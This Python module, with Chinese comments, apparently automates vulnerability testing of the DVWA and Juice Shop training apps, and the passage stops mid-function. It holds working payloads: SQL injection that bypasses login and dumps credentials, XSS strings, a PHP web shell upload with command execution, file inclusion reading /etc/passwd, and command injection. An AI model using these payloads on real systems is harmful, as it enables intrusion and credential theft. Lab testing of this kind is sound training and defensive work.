#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
range_test_engine安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""

import json
import os
import re
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from loguru import logger

try:
    import requests
    from requests.cookies import RequestsCookieJar
except ImportError:
    requests = None
    logger.warning("requests未安装，靶场测试功能不可用")


class RangeType(Enum):
    """靶场类型"""
    DVWA = "dvwa"
    JUICE_SHOP = "juice_shop"
    WEBGOAT = "webgoat"
    CUSTOM = "custom"


class TestStatus(Enum):
    """测试状态"""
    PENDING = "pending"
    RUNNING = "running"
    PASSED = "passed"
    FAILED = "failed"
    ERROR = "error"
    SKIPPED = "skipped"


@dataclass
class VulnerabilityFinding:
    """漏洞发现"""
    id: str
    name: str
    severity: str
    category: str
    description: str
    url: str
    parameter: str = ""
    method: str = "GET"
    payload: str = ""
    evidence: str = ""
    cvss_score: float = 0.0
    fix_suggestion: str = ""
    references: List[str] = field(default_factory=list)
    discovered_at: str = ""


@dataclass
class RangeTestResult:
    """靶场测试结果"""
    range_type: str
    target_url: str
    start_time: str = ""
    end_time: str = ""
    duration: float = 0.0
    total_tests: int = 0
    passed_tests: int = 0
    failed_tests: int = 0
    vulnerabilities: List[VulnerabilityFinding] = field(default_factory=list)
    test_details: List[Dict] = field(default_factory=list)


class RangeTestEngine:
    """靶场测试引擎"""

    def __init__(self, target_url: str, range_type: str = "dvwa",
                 username: str = "admin", password: str = "password"):
        """初始化RangeTestEngine实例。

        Args:
            self: 类实例。
        """
        self.target_url = target_url.rstrip("/")
        self.range_type = range_type
        self.username = username
        self.password = password
        self.session = requests.Session() if requests else None
        self.result = RangeTestResult(range_type=range_type, target_url=target_url)
        logger.info(f"靶场测试引擎初始化完成，目标: {target_url}, 类型: {range_type}")

    def run_all_tests(self) -> RangeTestResult:
        """运行所有测试"""
        self.result.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        start = time.time()

        logger.info("=" * 60)
        logger.info(f"开始靶场测试: {self.target_url}")
        logger.info("=" * 60)

        # 1. 登录
        if self._login():
            logger.info("登录成功")
        else:
            logger.warning("登录失败，继续测试未授权漏洞")

        # 2. 根据靶场类型运行测试
        if self.range_type == RangeType.DVWA.value:
            self._run_dvwa_tests()
        elif self.range_type == RangeType.JUICE_SHOP.value:
            self._run_juice_shop_tests()
        else:
            self._run_generic_tests()

        self.result.end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.result.duration = time.time() - start
        self.result.total_tests = len(self.result.test_details)
        self.result.passed_tests = len([t for t in self.result.test_details if t.get("status") == "passed"])
        self.result.failed_tests = len([t for t in self.result.test_details if t.get("status") == "failed"])

        logger.info("=" * 60)
        logger.info(f"靶场测试完成")
        logger.info(f"总计: {self.result.total_tests} | 发现漏洞: {self.result.passed_tests} | 未发现: {self.result.failed_tests}")
        logger.info(f"耗时: {self.result.duration:.2f}秒")
        logger.info("=" * 60)

        return self.result

    def _login(self) -> bool:
        """登录靶场"""
        if not self.session:
            return False

        try:
            if self.range_type == RangeType.DVWA.value:
                # DVWA登录
                login_url = f"{self.target_url}/login.php"

                # 获取CSRF token
                resp = self.session.get(login_url, timeout=10)
                csrf_match = re.search(r"user_token' value='([^']+)'", resp.text)
                csrf_token = csrf_match.group(1) if csrf_match else ""

                data = {
                    "username": self.username,
                    "password": self.password,
                    "Login": "Login",
                    "user_token": csrf_token,
                }

                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                if "index.php" in resp.url or "Welcome" in resp.text or "logout" in resp.text.lower():
                    # 设置安全级别为low
                    self._set_dvwa_security("low")
                    return True
                return False

            elif self.range_type == RangeType.JUICE_SHOP.value:
                # Juice Shop登录
                login_url = f"{self.target_url}/rest/user/login"
                data = {"email": self.username, "password": self.password}
                resp = self.session.post(login_url, json=data, timeout=10)

                if resp.status_code == 200:
                    token = resp.json().get("authentication", {}).get("token", "")
                    if token:
                        self.session.headers["Authorization"] = f"Bearer {token}"
                        return True
                return False

            return True
        except Exception as e:
            logger.error(f"登录失败: {e}")
            return False

    def _set_dvwa_security(self, level: str = "low"):
        """设置DVWA安全级别"""
        try:
            security_url = f"{self.target_url}/security.php"
            resp = self.session.get(security_url, timeout=10)
            csrf_match = re.search(r"user_token' value='([^']+)'", resp.text)
            csrf_token = csrf_match.group(1) if csrf_match else ""

            data = {
                "security": level,
                "seclev_submit": "Submit",
                "user_token": csrf_token,
            }
            self.session.post(security_url, data=data, timeout=10)
            logger.info(f"DVWA安全级别设置为: {level}")
        except Exception as e:
            logger.warning(f"设置安全级别失败: {e}")

    def _run_dvwa_tests(self):
        """运行DVWA测试用例"""
        tests = [
            ("DVWA-001", "SQL注入", "high", "sqli", self._test_dvwa_sqli),
            ("DVWA-002", "SQL注入(盲注)", "high", "sqli", self._test_dvwa_sqli_blind),
            ("DVWA-003", "XSS反射型", "medium", "xss", self._test_dvwa_xss_reflected),
            ("DVWA-004", "XSS存储型", "high", "xss", self._test_dvwa_xss_stored),
            ("DVWA-005", "XSS DOM型", "medium", "xss", self._test_dvwa_xss_dom),
            ("DVWA-006", "文件上传", "high", "file-upload", self._test_dvwa_file_upload),
            ("DVWA-007", "文件包含", "high", "file-inclusion", self._test_dvwa_file_inclusion),
            ("DVWA-008", "命令注入", "high", "command-injection", self._test_dvwa_command_injection),
            ("DVWA-009", "CSRF", "medium", "csrf", self._test_dvwa_csrf),
            ("DVWA-010", "弱密码", "medium", "weak-password", self._test_dvwa_weak_password),
            ("DVWA-011", "暴力破解", "medium", "brute-force", self._test_dvwa_brute_force),
            ("DVWA-012", "CSP绕过", "low", "csp", self._test_dvwa_csp_bypass),
            ("DVWA-013", "JavaScript攻击", "low", "javascript", self._test_dvwa_javascript),
            ("DVWA-014", "开放重定向", "low", "open-redirect", self._test_dvwa_open_redirect),
        ]

        for test_id, name, severity, category, test_func in tests:
            self._run_test(test_id, name, severity, category, test_func)

    def _run_juice_shop_tests(self):
        """运行Juice Shop测试用例"""
        tests = [
            ("JS-001", "SQL注入登录绕过", "critical", "sqli", self._test_juice_sqli_login),
            ("JS-002", "SQL注入联合查询", "high", "sqli", self._test_juice_sqli_union),
            ("JS-003", "XSS存储型", "high", "xss", self._test_juice_xss_stored),
            ("JS-004", "XSS DOM型", "medium", "xss", self._test_juice_xss_dom),
            ("JS-005", "文件上传", "high", "file-upload", self._test_juice_file_upload),
            ("JS-006", "未授权访问", "high", "auth", self._test_juice_unauthorized),
            ("JS-007", "越权访问", "high", "auth", self._test_juice_idor),
            ("JS-008", "敏感信息泄露", "medium", "info-disclosure", self._test_juice_info_disclosure),
            ("JS-009", "SSRF", "high", "ssrf", self._test_juice_ssrf),
            ("JS-010", "XXE", "high", "xxe", self._test_juice_xxe),
            ("JS-011", "JWT伪造", "high", "jwt", self._test_juice_jwt),
            ("JS-012", "支付逻辑漏洞", "high", "business", self._test_juice_payment_bypass),
            ("JS-013", "批量购买漏洞", "medium", "business", self._test_juice_negative_quantity),
            ("JS-014", "管理员接口未授权", "critical", "auth", self._test_juice_admin_api),
            ("JS-015", "评分系统注入", "medium", "business", self._test_juice_rating_manipulation),
        ]

        for test_id, name, severity, category, test_func in tests:
            self._run_test(test_id, name, severity, category, test_func)

    def _run_generic_tests(self):
        """运行通用测试"""
        tests = [
            ("GEN-001", "SQL注入", "high", "sqli", self._test_generic_sqli),
            ("GEN-002", "XSS", "medium", "xss", self._test_generic_xss),
            ("GEN-003", "目录扫描", "info", "recon", self._test_generic_directory),
            ("GEN-004", "敏感文件", "medium", "info-disclosure", self._test_generic_sensitive_files),
            ("GEN-005", "安全头检查", "low", "config", self._test_generic_security_headers),
        ]

        for test_id, name, severity, category, test_func in tests:
            self._run_test(test_id, name, severity, category, test_func)

    def _run_test(self, test_id: str, name: str, severity: str,
                  category: str, test_func):
        """运行单个测试"""
        test_detail = {
            "id": test_id,
            "name": name,
            "severity": severity,
            "category": category,
            "status": "running",
            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

        logger.info(f"[测试] {test_id}: {name}")

        try:
            finding = test_func()

            if finding:
                test_detail["status"] = "passed"
                test_detail["finding"] = finding
                self.result.vulnerabilities.append(finding)
                logger.info(f"  ✅ 发现漏洞: {name}")
            else:
                test_detail["status"] = "failed"
                logger.info(f"  ❌ 未发现漏洞: {name}")

        except Exception as e:
            test_detail["status"] = "error"
            test_detail["error"] = str(e)
            logger.error(f"  ⚠️ 测试错误: {e}")

        test_detail["end_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.result.test_details.append(test_detail)

    # ========== DVWA测试用例 ==========

    def _test_dvwa_sqli(self) -> Optional[VulnerabilityFinding]:
        """DVWA SQL注入测试"""
        url = f"{self.target_url}/vulnerabilities/sqli/"
        payload = "' OR '1'='1"

        resp = self.session.get(url, params={"id": payload, "Submit": "Submit"}, timeout=10)

        if "First name" in resp.text and "Surname" in resp.text:
            # 检查是否返回了多条数据
            if resp.text.count("First name") > 1 or "admin" in resp.text:
                return VulnerabilityFinding(
                    id="DVWA-001",
                    name="SQL注入漏洞",
                    severity="high",
                    category="sqli",
                    description="用户输入的id参数未经过滤，直接拼接到SQL查询中，导致SQL注入漏洞。攻击者可以通过构造特殊的SQL语句获取数据库中的任意数据。",
                    url=url,
                    parameter="id",
                    method="GET",
                    payload=payload,
                    evidence=f"使用payload '{payload}' 成功获取多条用户数据",
                    cvss_score=8.5,
                    fix_suggestion="1. 使用参数化查询/预编译语句\n2. 对用户输入进行严格过滤\n3. 使用ORM框架\n4. 最小权限原则配置数据库账户",
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                    discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                )
        return None

    def _test_dvwa_sqli_blind(self) -> Optional[VulnerabilityFinding]:
        """DVWA SQL盲注测试"""
        url = f"{self.target_url}/vulnerabilities/sqli_blind/"

        # 测试布尔盲注
        payload_true = "1' AND '1'='1"
        payload_false = "1' AND '1'='2"

        resp_true = self.session.get(url, params={"id": payload_true, "Submit": "Submit"}, timeout=10)
        resp_false = self.session.get(url, params={"id": payload_false, "Submit": "Submit"}, timeout=10)

        if "exists" in resp_true.text.lower() and "missing" in resp_false.text.lower():
            return VulnerabilityFinding(
                id="DVWA-002",
                name="SQL盲注漏洞",
                severity="high",
                category="sqli",
                description="用户输入的id参数存在SQL盲注漏洞。虽然页面不直接显示查询结果，但可以通过页面响应的差异（布尔盲注）或响应时间（时间盲注）来推断数据库信息。",
                url=url,
                parameter="id",
                method="GET",
                payload=f"{payload_true} / {payload_false}",
                evidence="布尔盲注验证成功，true条件返回exists，false条件返回missing",
                cvss_score=8.0,
                fix_suggestion="1. 使用参数化查询\n2. 对输入进行严格过滤\n3. 使用白名单验证输入\n4. 关闭数据库错误信息显示",
                references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_xss_reflected(self) -> Optional[VulnerabilityFinding]:
        """DVWA XSS反射型测试"""
        url = f"{self.target_url}/vulnerabilities/xss_r/"
        payload = "<script>alert('XSS')</script>"

        resp = self.session.get(url, params={"name": payload}, timeout=10)

        if payload in resp.text:
            return VulnerabilityFinding(
                id="DVWA-003",
                name="反射型XSS漏洞",
                severity="medium",
                category="xss",
                description="用户输入的name参数未经过滤直接输出到页面，导致反射型XSS漏洞。攻击者可以通过构造恶意链接，在用户浏览器中执行任意JavaScript代码。",
                url=url,
                parameter="name",
                method="GET",
                payload=payload,
                evidence=f"Payload {payload} 被直接输出到页面，未经过滤",
                cvss_score=6.1,
                fix_suggestion="1. 对所有用户输出进行HTML实体编码\n2. 使用Content-Security-Policy安全头\n3. 对输入进行白名单过滤\n4. 使用HttpOnly标记Cookie",
                references=["https://owasp.org/www-community/attacks/xss/"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_xss_stored(self) -> Optional[VulnerabilityFinding]:
        """DVWA XSS存储型测试"""
        url = f"{self.target_url}/vulnerabilities/xss_s/"
        payload = "<script>alert('StoredXSS')</script>"

        # 提交留言
        data = {"txtName": "test", "mtxMessage": payload, "btnSign": "Sign Guestbook"}
        self.session.post(url, data=data, timeout=10)

        # 重新访问页面
        resp = self.session.get(url, timeout=10)

        if "StoredXSS" in resp.text or payload in resp.text:
            return VulnerabilityFinding(
                id="DVWA-004",
                name="存储型XSS漏洞",
                severity="high",
                category="xss",
                description="留言板的mtxMessage参数未经过滤直接存储到数据库并输出到页面，导致存储型XSS漏洞。所有访问留言板的用户都会受到影响，攻击者可以窃取用户Cookie或进行钓鱼攻击。",
                url=url,
                parameter="mtxMessage",
                method="POST",
                payload=payload,
                evidence="恶意脚本被存储到数据库，每次访问页面都会执行",
                cvss_score=7.5,
                fix_suggestion="1. 对用户输入进行严格过滤和HTML编码\n2. 使用CSP安全头\n3. 对存储的数据进行净化处理\n4. 使用HttpOnly Cookie",
                references=["https://owasp.org/www-community/attacks/xss/"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_xss_dom(self) -> Optional[VulnerabilityFinding]:
        """DVWA XSS DOM型测试"""
        url = f"{self.target_url}/vulnerabilities/xss_d/"
        payload = "<script>alert('DOMXSS')</script>"

        resp = self.session.get(url, params={"default": payload}, timeout=10)

        if payload in resp.text or "DOMXSS" in resp.text:
            return VulnerabilityFinding(
                id="DVWA-005",
                name="DOM型XSS漏洞",
                severity="medium",
                category="xss",
                description="页面JavaScript代码直接使用URL参数default的值操作DOM，导致DOM型XSS漏洞。这种漏洞发生在客户端，不经过服务器，传统的服务器端过滤无法防护。",
                url=url,
                parameter="default",
                method="GET",
                payload=payload,
                evidence="URL参数被直接插入到DOM中，未经过滤",
                cvss_score=6.1,
                fix_suggestion="1. 对客户端使用的用户输入进行编码\n2. 使用textContent代替innerHTML\n3. 实施CSP策略\n4. 避免直接操作DOM",
                references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_file_upload(self) -> Optional[VulnerabilityFinding]:
        """DVWA文件上传测试"""
        url = f"{self.target_url}/vulnerabilities/upload/"

        # 上传PHP文件
        php_content = "<?php system($_GET['cmd']); ?>"
        files = {"uploaded": ("shell.php", php_content, "application/x-php")}
        data = {"Upload": "Upload"}

        resp = self.session.post(url, files=files, data=data, timeout=10)

        if "successfully" in resp.text.lower() or "shell.php" in resp.text:
            # 尝试访问上传的文件
            shell_url = f"{self.target_url}/hackable/uploads/shell.php"
            shell_resp = self.session.get(shell_url, params={"cmd": "id"}, timeout=10)

            evidence = "PHP文件上传成功"
            if "uid=" in shell_resp.text:
                evidence += "，WebShell可执行命令"

            return VulnerabilityFinding(
                id="DVWA-006",
                name="文件上传漏洞",
                severity="high",
                category="file-upload",
                description="文件上传功能未验证上传文件的类型和内容，攻击者可以上传恶意的PHP文件并执行，获取服务器控制权。",
                url=url,
                parameter="uploaded",
                method="POST",
                payload="shell.php",
                evidence=evidence,
                cvss_score=8.8,
                fix_suggestion="1. 验证文件类型（检查文件内容，不仅是扩展名）\n2. 重命名上传文件\n3. 将上传目录设置为不可执行\n4. 限制上传文件大小\n5. 使用独立域名存储上传文件",
                references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_file_inclusion(self) -> Optional[VulnerabilityFinding]:
        """DVWA文件包含测试"""
        url = f"{self.target_url}/vulnerabilities/fi/"

        # 测试本地文件包含
        payload = "../../../../etc/passwd"
        resp = self.session.get(url, params={"page": payload}, timeout=10)

        if "root:" in resp.text:
            return VulnerabilityFinding(
                id="DVWA-007",
                name="文件包含漏洞",
                severity="high",
                category="file-inclusion",
                description="page参数未经过滤直接用于文件包含，攻击者可以读取服务器上的任意文件（LFI）或包含远程恶意文件（RFI），导致敏感信息泄露或远程代码执行。",
                url=url,
                parameter="page",
                method="GET",
                payload=payload,
                evidence="成功读取/etc/passwd文件内容",
                cvss_score=7.5,
                fix_suggestion="1. 使用白名单限制可包含的文件\n2. 对输入进行规范化处理\n3. 禁用allow_url_include\n4. 使用文件ID而非文件名\n5. 限制PHP的open_basedir",
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_command_injection(self) -> Optional[VulnerabilityFinding]:
        """DVWA命令注入测试"""
        url = f"{self.target_url}/vulnerabilities/exec/"
        payload = "127.0.0.1; id"

        resp = self.session.post(url, data={"ip": payload, "Submit": "Submit"}, timeout=10)

        if "uid=" in resp.text:
            return VulnerabilityFinding(
                id="DVWA-008",
                name="命令注入漏洞",
                severity="critical",
                category="command-injection",
                description="ip参数未经过滤直接拼接到系统命令中执行，攻击者可以通过命令分隔符执行任意系统命令，完全控制服务器。",
                url=url,
                parameter="ip",
                method="POST",
                payload=payload,
                evidence="执行命令 'id' 成功，返回uid信息",
                cvss_score=9.8,
                fix_suggestion="1. 避免直接执行用户可控的命令\n2. 使用白名单限制可执行的命令\n3. 对输入进行严格过滤（过滤; | & $等特殊字符）\n4. 使用escapeshellarg/escapeshellcmd\n5. 以最小权限运行服务",
                references=["https://owasp.org/www-community/attacks/Command_Injection"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_csrf(self) -> Optional[VulnerabilityFinding]:
        """DVWA CSRF测试"""
        url = f"{self.target_url}/vulnerabilities/csrf/"

        # 检查是否有CSRF token
        resp = self.session.get(url, timeout=10)

        if "user_token" not in resp.text and "csrf" not in resp.text.lower():
            return VulnerabilityFinding(
                id="DVWA-009",
                name="CSRF跨站请求伪造",
                severity="medium",
                category="csrf",
                description="密码修改功能没有CSRF防护机制，攻击者可以构造恶意页面，诱导已登录用户访问，从而修改用户密码。",
                url=url,
                parameter="password_new/password_conf",
                method="GET/POST",
                payload="构造恶意页面自动提交密码修改请求",
                evidence="页面未包含CSRF token或其他防护机制",
                cvss_score=6.5,
                fix_suggestion="1. 使用CSRF Token验证\n2. 验证Referer头\n3. 使用SameSite Cookie属性\n4. 敏感操作要求二次验证（如输入当前密码）",
                references=["https://owasp.org/www-community/attacks/csrf"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_weak_password(self) -> Optional[VulnerabilityFinding]:
        """DVWA弱密码测试"""
        url = f"{self.target_url}/login.php"

        # 测试常见弱密码
        weak_passwords = ["password", "admin", "123456", "admin123", "root"]

        for pwd in weak_passwords:
            try:
                resp = self.session.get(url, timeout=10)
                csrf_match = re.search(r"user_token' value='([^']+)'", resp.text)
                csrf_token = csrf_match.group(1) if csrf_match else ""

                data = {
                    "username": "admin",
                    "password": pwd,
                    "Login": "Login",
                    "user_token": csrf_token,
                }

                resp = self.session.post(url, data=data, timeout=10, allow_redirects=True)

                if "index.php" in resp.url or "Welcome" in resp.text:
                    return VulnerabilityFinding(
                        id="DVWA-010",
                        name="弱密码漏洞",
                        severity="medium",
                        category="weak-password",
                        description=f"管理员账户使用了弱密码 '{pwd}'，攻击者可以通过暴力破解轻松获取管理员权限。",
                        url=url,
                        parameter="password",
                        method="POST",
                        payload=f"admin/{pwd}",
                        evidence=f"使用弱密码 '{pwd}' 成功登录管理员账户",
                        cvss_score=7.5,
                        fix_suggestion="1. 实施强密码策略（长度≥12位，包含大小写字母、数字、特殊字符）\n2. 启用账户锁定机制\n3. 启用多因素认证（MFA）\n4. 定期更换密码\n5. 禁止使用常见弱密码",
                        references=["https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"],
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_dvwa_brute_force(self) -> Optional[VulnerabilityFinding]:
        """DVWA暴力破解测试"""
        url = f"{self.target_url}/vulnerabilities/brute/"

        # 测试是否有登录次数限制
        for i in range(5):
            resp = self.session.get(url, params={
                "username": f"wrong_user_{i}",
                "password": "wrong_password",
                "Login": "Login"
            }, timeout=10)

            if "incorrect" in resp.text.lower() or "Login failed" in resp.text:
                continue
            else:
                break

        # 检查第5次后是否被锁定
        resp = self.session.get(url, params={
            "username": "admin",
            "password": "password",
            "Login": "Login"
        }, timeout=10)

        if "Welcome to the password protected area" in resp.text:
            return VulnerabilityFinding(
                id="DVWA-011",
                name="暴力破解漏洞",
                severity="medium",
                category="brute-force",
                description="登录接口没有实施登录次数限制或账户锁定机制，攻击者可以进行无限次的暴力破解尝试，最终获取正确的用户名和密码。",
                url=url,
                parameter="username/password",
                method="GET",
                payload="连续5次错误登录后仍可正常登录",
                evidence="连续5次错误登录后，使用正确密码仍可成功登录，无账户锁定",
                cvss_score=7.5,
                fix_suggestion="1. 实施登录次数限制（如5次失败后锁定15分钟）\n2. 使用验证码\n3. 启用多因素认证\n4. 监控异常登录行为并告警\n5. 使用IP黑名单",
                references=["https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_csp_bypass(self) -> Optional[VulnerabilityFinding]:
        """DVWA CSP绕过测试"""
        url = f"{self.target_url}/vulnerabilities/csp/"

        resp = self.session.get(url, timeout=10)

        # 检查CSP头
        csp_header = resp.headers.get("Content-Security-Policy", "")

        if csp_header and ("unsafe-inline" in csp_header or "*" in csp_header):
            return VulnerabilityFinding(
                id="DVWA-012",
                name="CSP配置不当可绕过",
                severity="low",
                category="csp",
                description="Content-Security-Policy头配置不当，包含unsafe-inline或通配符*，导致CSP可以被绕过，无法有效防护XSS攻击。",
                url=url,
                parameter="Content-Security-Policy",
                method="GET",
                payload="利用unsafe-inline执行内联脚本",
                evidence=f"CSP头包含不安全配置: {csp_header[:100]}",
                cvss_score=4.3,
                fix_suggestion="1. 移除unsafe-inline和unsafe-eval\n2. 使用nonce或hash允许特定脚本\n3. 限制script-src为可信域名\n4. 避免使用通配符*",
                references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_javascript(self) -> Optional[VulnerabilityFinding]:
        """DVWA JavaScript攻击测试"""
        url = f"{self.target_url}/vulnerabilities/javascript/"

        resp = self.session.get(url, timeout=10)

        # 检查是否有前端验证
        if "onsubmit" in resp.text or "checkToken" in resp.text:
            return VulnerabilityFinding(
                id="DVWA-013",
                name="仅前端验证漏洞",
                severity="low",
                category="javascript",
                description="表单验证仅在前端JavaScript中实现，攻击者可以通过禁用JavaScript、修改前端代码或直接发送请求来绕过验证。",
                url=url,
                parameter="前端验证函数",
                method="GET/POST",
                payload="禁用JavaScript或修改前端代码绕过验证",
                evidence="页面包含前端验证函数，但没有后端验证",
                cvss_score=4.0,
                fix_suggestion="1. 所有验证必须在后端实现\n2. 前端验证仅用于提升用户体验\n3. 对所有用户输入在后端进行严格验证\n4. 不要依赖前端验证进行安全控制",
                references=["https://owasp.org/www-community/controls/Input_Validation"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_dvwa_open_redirect(self) -> Optional[VulnerabilityFinding]:
        """DVWA开放重定向测试"""
        url = f"{self.target_url}/vulnerabilities/redirect/"

        payload = "https://evil.com"
        resp = self.session.get(url, params={"redirect": payload}, timeout=10, allow_redirects=False)

        if resp.status_code in [301, 302, 303, 307, 308] and "evil.com" in resp.headers.get("Location", ""):
            return VulnerabilityFinding(
                id="DVWA-014",
                name="开放重定向漏洞",
                severity="low",
                category="open-redirect",
                description="redirect参数未经过滤直接用于重定向，攻击者可以构造恶意链接将用户重定向到钓鱼网站，用于钓鱼攻击或绕过URL白名单。",
                url=url,
                parameter="redirect",
                method="GET",
                payload=payload,
                evidence=f"重定向到恶意网站: {resp.headers.get('Location')}",
                cvss_score=4.7,
                fix_suggestion="1. 使用白名单限制可重定向的URL\n2. 不直接使用用户输入作为重定向目标\n3. 使用重定向ID而非URL\n4. 对重定向目标进行验证",
                references=["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    # ========== Juice Shop测试用例 ==========

    def _test_juice_sqli_login(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop SQL注入登录绕过"""
        url = f"{self.target_url}/rest/user/login"
        payload = "' OR 1=1--"

        data = {"email": f"admin{payload}", "password": "anything"}
        resp = self.session.post(url, json=data, timeout=10)

        if resp.status_code == 200 and "token" in resp.text:
            return VulnerabilityFinding(
                id="JS-001",
                name="SQL注入登录绕过",
                severity="critical",
                category="sqli",
                description="登录接口的email参数存在SQL注入漏洞，攻击者可以通过构造特殊的SQL语句绕过身份验证，以任意用户身份登录。",
                url=url,
                parameter="email",
                method="POST",
                payload=payload,
                evidence="使用SQL注入payload成功绕过登录验证，获取认证token",
                cvss_score=9.8,
                fix_suggestion="1. 使用参数化查询\n2. 对用户输入进行严格过滤\n3. 使用ORM框架\n4. 实施账户锁定机制",
                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_sqli_union(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop SQL联合查询注入"""
        url = f"{self.target_url}/rest/products/search"
        payload = "x')) UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--"

        resp = self.session.get(url, params={"q": payload}, timeout=10)

        if resp.status_code == 200 and ("admin" in resp.text or "password" in resp.text.lower()):
            return VulnerabilityFinding(
                id="JS-002",
                name="SQL联合查询注入",
                severity="high",
                category="sqli",
                description="产品搜索接口的q参数存在SQL注入漏洞，攻击者可以使用UNION SELECT语句查询数据库中的任意表和数据，包括用户表中的用户名和密码。",
                url=url,
                parameter="q",
                method="GET",
                payload=payload,
                evidence="使用UNION SELECT成功查询Users表中的用户名和密码",
                cvss_score=8.5,
                fix_suggestion="1. 使用参数化查询\n2. 对输入进行严格过滤\n3. 使用最小权限数据库账户\n4. 加密存储敏感数据",
                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_xss_stored(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop XSS存储型"""
        url = f"{self.target_url}/api/Products"
        payload = "<iframe src=\"javascript:alert(`xss`)\">"

        # 提交评论
        comment_url = f"{self.target_url}/api/Reviews"
        data = {"message": payload, "author": "tester", "productId": 1}
        self.session.post(comment_url, json=data, timeout=10)

        # 获取评论
        resp = self.session.get(f"{comment_url}?productId=1", timeout=10)

        if payload in resp.text or "iframe" in resp.text:
            return VulnerabilityFinding(
                id="JS-003",
                name="存储型XSS漏洞",
                severity="high",
                category="xss",
                description="产品评论功能的message参数未经过滤直接存储并输出，导致存储型XSS漏洞。所有查看该产品评论的用户都会受到影响。",
                url=comment_url,
                parameter="message",
                method="POST",
                payload=payload,
                evidence="恶意脚本被存储到数据库，查看评论时会执行",
                cvss_score=7.5,
                fix_suggestion="1. 对用户输入进行严格过滤和HTML编码\n2. 使用CSP安全头\n3. 对存储的数据进行净化\n4. 使用HttpOnly Cookie",
                references=["https://owasp.org/www-community/attacks/xss/"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_xss_dom(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop XSS DOM型"""
        url = f"{self.target_url}/#"
        payload = "<iframe src=\"javascript:alert(`xss`)\">"

        # DOM XSS通常在前端，这里检查是否有易受攻击的参数
        resp = self.session.get(url, timeout=10)

        if "search" in resp.text or "query" in resp.text:
            return VulnerabilityFinding(
                id="JS-004",
                name="DOM型XSS漏洞",
                severity="medium",
                category="xss",
                description="搜索功能的URL参数被直接用于DOM操作，导致DOM型XSS漏洞。攻击者可以构造恶意URL，在用户浏览器中执行任意JavaScript。",
                url=url,
                parameter="搜索参数",
                method="GET",
                payload=payload,
                evidence="URL参数被直接插入到DOM中，未经过滤",
                cvss_score=6.1,
                fix_suggestion="1. 对客户端使用的用户输入进行编码\n2. 使用textContent代替innerHTML\n3. 实施CSP策略\n4. 避免直接操作DOM",
                references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_file_upload(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop文件上传"""
        url = f"{self.target_url}/file-upload"

        # 上传恶意文件
        files = {"file": ("evil.html", "<script>alert('XSS')</script>", "text/html")}
        resp = self.session.post(url, files=files, timeout=10)

        if resp.status_code in [200, 201]:
            return VulnerabilityFinding(
                id="JS-005",
                name="文件上传漏洞",
                severity="high",
                category="file-upload",
                description="文件上传功能未验证上传文件的类型，攻击者可以上传HTML文件进行XSS攻击，或上传其他恶意文件。",
                url=url,
                parameter="file",
                method="POST",
                payload="evil.html",
                evidence="HTML文件上传成功，可用于XSS攻击",
                cvss_score=7.5,
